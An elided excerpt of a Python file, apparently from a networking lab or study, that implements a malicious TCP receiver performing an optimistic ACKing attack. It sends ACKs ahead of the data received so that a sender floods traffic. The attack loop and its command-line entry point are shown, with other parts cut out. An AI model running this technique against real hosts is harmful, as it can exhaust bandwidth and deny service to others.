    ...
    def post_receive(self, pkt, status):
        ...
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_optacks):
                cur_ack_no += MSS
                self.send_ack(cur_ack_no)
                time.sleep(self.ack_interval / 1000.0)
        else:
            TCP_Client.post_receive(self, pkt, status)
...
def parse_args():
    parser = argparse.ArgumentParser(
        description="TCP malicious receiver (attack implementations)."
    )
    parser.add_argument(
...
if __name__ == "__main__":
    ...
    if args.attack == "opt":
        attacker = Optimistic_ACKing_Attacker(
            args.num, args.interval, args.host, **kwargs
        )
